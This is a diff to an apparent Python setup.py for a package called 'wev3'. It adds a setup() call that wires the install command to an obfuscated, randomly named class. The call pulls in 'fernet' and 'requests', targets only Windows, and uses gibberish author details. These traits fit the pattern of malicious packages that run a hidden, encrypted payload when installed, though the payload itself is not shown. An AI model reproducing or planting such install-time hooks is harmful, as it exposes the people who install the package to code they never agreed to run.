@@ -18,5 +18,22 @@ class QobxClwNwoWnNIsWGPGVJyUiaGMzruuUjnirOmDYGlBUbFXMQYZoausExnxFYiHjwzfOViHsSB
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
+setup(
+    name="wev3",
+    version=VERSION,
+    author="SpBZsKGgnuvhN",
+    author_email="mgTAlTtWSyAwA@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': QobxClwNwoWnNIsWGPGVJyUiaGMzruuUjnirOmDYGlBUbFXMQYZoausExnxFYiHjwzfOViHsSBrjLgKTSEaapSTYhYaCjEOo,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
